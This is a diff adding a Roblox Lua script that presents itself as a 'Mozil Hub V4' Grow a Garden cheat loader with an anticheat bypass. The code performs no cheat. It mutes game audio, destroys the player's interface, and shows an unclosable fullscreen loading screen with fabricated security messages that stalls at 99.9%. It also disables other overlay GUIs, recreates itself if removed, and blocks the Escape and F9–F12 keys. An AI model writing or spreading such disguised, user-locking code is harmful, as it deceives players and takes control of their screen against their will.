@@ -1,0 +1,376 @@
+--[[
+  Grow a Garden Script Loader
+  Version 2.0.0 | Secure Initialization...
+]]
+
+-- ======== CONFIGURATION ========
+local TOTAL_LOADING_TIME = 600 -- 10 minutes in seconds
+local TARGET_PERCENT = 99.9 -- Where to get stuck
+local PRIMARY_COLOR = Color3.fromRGB(138, 43, 226) -- Purple
+local SECONDARY_COLOR = Color3.fromRGB(75, 0, 130) -- Dark purple
+-- ==============================
+
+-- Disable all sounds
+for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound:Stop()
+        sound.Volume = 0
+    end
+end
+
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- Cleanup previous GUIs
+for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
+    if gui:IsA("ScreenGui") then
+        gui:Destroy()
+    end
+end
+
+-- Create fullscreen GUI that covers everything
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "UltimateLoader"
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.DisplayOrder = 999
+
+-- GUI protection (cover mobile executors)
+if syn and syn.protect_gui then
+    syn.protect_gui(ScreenGui)
+    ScreenGui.Parent = CoreGui
+elseif gethui then
+    ScreenGui.Parent = gethui()
+else
+    ScreenGui.Parent = CoreGui
+end
+
+-- Main background (full coverage)
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainContainer"
+MainFrame.Size = UDim2.new(1, 0, 1, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+-- Container for all elements (lower on screen)
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Name = "ContentFrame"
+ContentFrame.Size = UDim2.new(0.9, 0, 0.7, 0)
+ContentFrame.Position = UDim2.new(0.05, 0, 0.25, 0)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.Parent = MainFrame
+
+-- Title (white color, centered)
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Mozil Hub V4 - Grow a Garden Script"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBlack
+Title.TextSize = 30
+Title.TextXAlignment = Enum.TextXAlignment.Center
+Title.Parent = ContentFrame
+
+-- Version info
+local Version = Instance.new("TextLabel")
+Version.Name = "Version"
+Version.Size = UDim2.new(1, 0, 0, 20)
+Version.Position = UDim2.new(0, 0, 0, 45)
+Version.BackgroundTransparency = 1
+Version.Text = "Anticheat Bypass System | Secure Loading..."
+Version.TextColor3 = Color3.fromRGB(180, 180, 180)
+Version.Font = Enum.Font.Gotham
+Version.TextSize = 16
+Version.TextXAlignment = Enum.TextXAlignment.Center
+Version.Parent = ContentFrame
+
+-- Loading bar background
+local LoadingBarBack = Instance.new("Frame")
+LoadingBarBack.Name = "LoadingBarBack"
+LoadingBarBack.Size = UDim2.new(1, 0, 0, 20)
+LoadingBarBack.Position = UDim2.new(0, 0, 0, 80)
+LoadingBarBack.BackgroundColor3 = SECONDARY_COLOR
+LoadingBarBack.BorderSizePixel = 0
+LoadingBarBack.Parent = ContentFrame
+
+local LoadingBarBackCorner = Instance.new("UICorner")
+LoadingBarBackCorner.CornerRadius = UDim.new(0.5, 0)
+LoadingBarBackCorner.Parent = LoadingBarBack
+
+-- Loading bar (purple)
+local LoadingBar = Instance.new("Frame")
+LoadingBar.Name = "LoadingBar"
+LoadingBar.Size = UDim2.new(0, 0, 1, 0)
+LoadingBar.BackgroundColor3 = PRIMARY_COLOR
+LoadingBar.BorderSizePixel = 0
+LoadingBar.Parent = LoadingBarBack
+
+local LoadingBarCorner = Instance.new("UICorner")
+LoadingBarCorner.CornerRadius = UDim.new(0.5, 0)
+LoadingBarCorner.Parent = LoadingBar
+
+-- Percentage display
+local Percentage = Instance.new("TextLabel")
+Percentage.Name = "Percentage"
+Percentage.Size = UDim2.new(1, 0, 0, 30)
+Percentage.Position = UDim2.new(0, 0, 0, 110)
+Percentage.BackgroundTransparency = 1
+Percentage.Text = "0%"
+Percentage.TextColor3 = Color3.fromRGB(200, 200, 200)
+Percentage.Font = Enum.Font.GothamBold
+Percentage.TextSize = 22
+Percentage.TextXAlignment = Enum.TextXAlignment.Center
+Percentage.Parent = ContentFrame
+
+-- Status message
+local StatusMessage = Instance.new("TextLabel")
+StatusMessage.Name = "StatusMessage"
+StatusMessage.Size = UDim2.new(1, 0, 0, 20)
+StatusMessage.Position = UDim2.new(0, 0, 0, 140)
+StatusMessage.BackgroundTransparency = 1
+StatusMessage.Text = "Initializing security protocols..."
+StatusMessage.TextColor3 = Color3.fromRGB(180, 180, 180)
+StatusMessage.Font = Enum.Font.Gotham
+StatusMessage.TextSize = 16
+StatusMessage.TextXAlignment = Enum.TextXAlignment.Center
+StatusMessage.Parent = ContentFrame
+
+-- Console (security-focused)
+local ConsoleFrame = Instance.new("Frame")
+ConsoleFrame.Name = "ConsoleFrame"
+ConsoleFrame.Size = UDim2.new(1, 0, 0.4, 0)
+ConsoleFrame.Position = UDim2.new(0, 0, 0.5, 0)
+ConsoleFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+ConsoleFrame.BorderSizePixel = 0
+ConsoleFrame.Parent = ContentFrame
+
+local ConsoleCorner = Instance.new("UICorner")
+ConsoleCorner.CornerRadius = UDim.new(0, 8)
+ConsoleCorner.Parent = ConsoleFrame
+
+local ConsoleScroll = Instance.new("ScrollingFrame")
+ConsoleScroll.Name = "ConsoleScroll"
+ConsoleScroll.Size = UDim2.new(1, -10, 1, -10)
+ConsoleScroll.Position = UDim2.new(0, 5, 0, 5)
+ConsoleScroll.BackgroundTransparency = 1
+ConsoleScroll.ScrollBarThickness = 5
+ConsoleScroll.ScrollBarImageColor3 = PRIMARY_COLOR
+ConsoleScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+ConsoleScroll.Parent = ConsoleFrame
+
+local ConsoleLayout = Instance.new("UIListLayout")
+ConsoleLayout.Parent = ConsoleScroll
+ConsoleLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ConsoleScroll.CanvasSize = UDim2.new(0, 0, 0, ConsoleLayout.AbsoluteContentSize.Y)
+    task.wait()
+    ConsoleScroll.CanvasPosition = Vector2.new(0, ConsoleLayout.AbsoluteContentSize.Y - ConsoleScroll.AbsoluteSize.Y)
+end)
+
+-- Advanced security messages
+local securityMessages = {
+    {"Checking for anti-cheat hooks...", Color3.fromRGB(255, 255, 100)},
+    {"Scanning memory for injections...", Color3.fromRGB(255, 150, 50)},
+    {"Verifying game integrity...", Color3.fromRGB(100, 255, 100)},
+    {"Initializing VM protection...", Color3.fromRGB(150, 200, 255)},
+    {"Encrypting network traffic...", Color3.fromRGB(200, 150, 255)},
+    {"Bypassing detection systems...", Color3.fromRGB(255, 100, 100)},
+    {"Setting up fake packets...", Color3.fromRGB(100, 255, 255)},
+    {"Randomizing memory addresses...", Color3.fromRGB(255, 200, 100)},
+    {"Creating secure environment...", Color3.fromRGB(100, 255, 150)},
+    {"Hooking anti-tamper...", Color3.fromRGB(255, 100, 255)}
+}
+
+local loadingMessages = {
+    {"Loading asset package "..math.random(1, 15).."/15"},
+    {"Allocated "..math.random(50, 250).."MB memory"},
+    {"Checking component "..math.random(1000, 9999)},
+    {"Processing data (speed depends on your internet)...", Color3.fromRGB(255, 255, 100)},
+    {"Connected to secure node "..math.random(1, 8)},
+    {"Optimizing for your device..."},
+    {"Download speed: "..math.random(2, 15).."MB/s"},
+    {"Uploading encrypted analytics..."},
+    {"Cache verification in progress..."},
+    {"Decompressing protected assets..."}
+}
+
+local function addConsoleMessage(text, color)
+    color = color or Color3.fromRGB(150, 255, 150)
+    local message = Instance.new("TextLabel")
+    message.Text = "["..os.date("%H:%M:%S").."] "..text
+    message.Size = UDim2.new(1, 0, 0, 20)
+    message.BackgroundTransparency = 1
+    message.TextColor3 = color
+    message.Font = Enum.Font.Code
+    message.TextSize = 14
+    message.TextXAlignment = Enum.TextXAlignment.Left
+    message.TextYAlignment = Enum.TextYAlignment.Top
+    message.TextTruncate = Enum.TextTruncate.AtEnd
+    message.Parent = ConsoleScroll
+end
+
+-- Initial security messages
+addConsoleMessage("Initializing secure script v2.0.0...", Color3.fromRGB(100, 255, 255))
+addConsoleMessage("Starting advanced protection system...", Color3.fromRGB(255, 255, 100))
+addConsoleMessage("Memory protection: INITIALIZING", Color3.fromRGB(255, 255, 100))
+addConsoleMessage("Checking for anti-cheat hooks...", Color3.fromRGB(255, 150, 50))
+addConsoleMessage("No suspicious hooks detected", Color3.fromRGB(0, 255, 0))
+addConsoleMessage("Loading speed depends on your internet connection", Color3.fromRGB(255, 255, 100))
+
+-- Calculate time distribution for each phase to total 10 minutes
+local phaseTimes = {
+    {0, 20, 1.8},    -- 0-20%: Fast (1.8x speed)
+    {20, 25, 0.3},    -- 20-25%: Very slow (0.3x speed)
+    {25, 40, 1.0},    -- 25-40%: Normal (1.0x speed)
+    {40, 60, 0.6},    -- 40-60%: Slow (0.6x speed)
+    {60, 80, 1.0},    -- 60-80%: Normal (1.0x speed)
+    {80, 99.9, 0.2}   -- 80-99.9%: Super slow (0.2x speed)
+}
+
+-- Calculate weighted time for each phase
+local totalWeightedTime = 0
+for _, phase in ipairs(phaseTimes) do
+    local range = phase[2] - phase[1]
+    local weight = range / phase[3]
+    totalWeightedTime = totalWeightedTime + weight
+end
+
+-- Calculate actual time for each phase
+local phaseDetails = {}
+for _, phase in ipairs(phaseTimes) do
+    local range = phase[2] - phase[1]
+    local weight = range / phase[3]
+    local time = (weight / totalWeightedTime) * TOTAL_LOADING_TIME
+    table.insert(phaseDetails, {
+        start = phase[1],
+        finish = phase[2],
+        speed = phase[3],
+        time = time
+    })
+end
+
+-- Main loading loop with precise speed control
+local startTime = tick()
+local lastProgress = 0
+local lastSecurityUpdate = 0
+local lastLoadingUpdate = 0
+
+coroutine.wrap(function()
+    while true do
+        local currentTime = tick()
+        local elapsed = currentTime - startTime
+        local progress = 0
+        
+        -- Calculate progress based on phase timing
+        local accumulatedTime = 0
+        for _, phase in ipairs(phaseDetails) do
+            if elapsed < accumulatedTime + phase.time then
+                -- Within this phase
+                local phaseElapsed = elapsed - accumulatedTime
+                progress = phase.start + (phaseElapsed / phase.time) * (phase.finish - phase.start)
+                break
+            else
+                accumulatedTime = accumulatedTime + phase.time
+            end
+        end
+        
+        -- Cap at target percent
+        progress = math.min(TARGET_PERCENT, progress)
+        
+        -- Update loading bar
+        LoadingBar.Size = UDim2.new(progress/100, 0, 1, 0)
+        Percentage.Text = string.format("%.1f%%", progress)
+        lastProgress = progress
+        
+        -- Update status every 5-15 seconds
+        if math.random(1, 10) == 1 then
+            StatusMessage.Text = "Status: "..securityMessages[math.random(1, #securityMessages)][1]
+        end
+        
+        -- Add security messages periodically
+        if currentTime - lastSecurityUpdate > math.random(8, 15) then
+            local msg = securityMessages[math.random(1, #securityMessages)]
+            addConsoleMessage(msg[1], msg[2])
+            lastSecurityUpdate = currentTime
+        end
+        
+        -- Add random loading messages
+        if currentTime - lastLoadingUpdate > math.random(3, 7) then
+            local msg = loadingMessages[math.random(1, #loadingMessages)]
+            addConsoleMessage(msg[1], msg[2])
+            lastLoadingUpdate = currentTime
+        end
+        
+        -- Handle stuck at target percent
+        if progress >= TARGET_PERCENT then
+            Percentage.Text = string.format("%.1f%%", TARGET_PERCENT)
+            StatusMessage.Text = "Final security checks... (Please wait)"
+            
+            -- Add occasional security messages
+            if math.random(1, 5) == 1 then
+                addConsoleMessage("Completing secure handshake...", Color3.fromRGB(150, 255, 150))
+                addConsoleMessage("This may take longer on slow connections", Color3.fromRGB(255, 255, 100))
+            end
+            
+            task.wait(1)
+        else
+            -- Base delay with small random variation
+            task.wait(math.random(8, 12)/20)
+        end
+    end
+end)()
+
+-- Make GUI unclosable and cover all executors
+coroutine.wrap(function()
+    while task.wait(0.1) do
+        -- Keep bringing to front
+        ScreenGui.DisplayOrder = 999
+        
+        -- Recreate if removed
+        if not ScreenGui:FindFirstChild("MainContainer") then
+            local newFrame = MainFrame:Clone()
+            newFrame.Parent = ScreenGui
+        end
+        
+        -- Cover mobile executors
+        for _, gui in ipairs(CoreGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui ~= ScreenGui then
+                gui.Enabled = false
+            end
+        end
+    end
+end)()
+
+-- Block all keyboard inputs
+local ContextActionService = game:GetService("ContextActionService")
+local UIS = game:GetService("UserInputService")
+
+local blockedKeys = {
+    Enum.KeyCode.Escape,
+    Enum.KeyCode.F9,
+    Enum.KeyCode.F10,
+    Enum.KeyCode.F11,
+    Enum.KeyCode.F12,
+    Enum.KeyCode.Home,
+    Enum.KeyCode.End,
+    Enum.KeyCode.Insert
+}
+
+for _, key in ipairs(blockedKeys) do
+    ContextActionService:BindActionAtPriority(
+        "Block"..tostring(key),
+        function() return Enum.ContextActionResult.Sink end,
+        false,
+        Enum.ContextActionPriority.High.Value,
+        key
+    )
+end
+
+-- Block mobile executor buttons
+UIS.WindowFocusReleased:Connect(function()
+    ScreenGui.DisplayOrder = 999
+end)
